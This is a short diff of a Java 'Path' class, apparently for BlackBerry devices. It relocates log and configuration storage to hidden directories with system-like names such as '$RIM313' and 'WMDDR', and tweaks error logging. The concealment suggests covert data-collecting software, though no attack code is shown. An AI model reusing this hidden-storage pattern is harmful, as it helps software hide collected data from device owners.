@@ -28,10 +28,12 @@ public final class Path {
     private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
 
     /** The Constant SD_PATH. */
-    public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";
+    //public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";
+    //public static final String SD_PATH = "file:///SDCard/BlackBerry/WMDDR/";
+    public static final String SD_PATH = "file:///store/home/user/$RIM313/";
 
     /** The Constant USER_PATH. */
-    public static final String USER_PATH = "file:///store/home/user/$RIM313/";
+    public static final String USER_PATH = "file:///store/home/user/WMDDR/";
 
     /** The Constant LOG_DIR_BASE. */
     public static final String LOG_DIR_BASE = "1";
@@ -42,7 +44,7 @@ public final class Path {
     /** The Constant CONF_DIR. */
     public static final String CONF_DIR = "2/";
 
-    public static final String LOG_PATH = SD_PATH;
+    //public static final String LOG_PATH = SD_PATH;
 
     /**
      * Crea la directory specificata e la rende hidden. Non crea ricosivamente
@@ -64,12 +66,7 @@ public final class Path {
                     Connector.READ_WRITE);
 
             if (fconn.exists()) {
-                /*
-                 * if (debug != null) { //#debug
-                 * debug.trace("Directory exists"); }
-                 */
-
-                return false;
+                return true;
             }
 
             fconn.mkdir();
@@ -82,7 +79,7 @@ public final class Path {
         } catch (final IOException e) {
 
             // #debug
-            debug.error(e.toString());
+            debug.error(dirName + " ex: "+ e.toString());
             return false;
 
         } finally {
@@ -92,7 +89,7 @@ public final class Path {
                 } catch (final IOException e) {
                     // #mdebug
                     if (debug != null) {
-                        debug.error(e.toString());
+                        debug.error(dirName + " ex: "+ e.toString());
                     }
                     //#enddebug
 
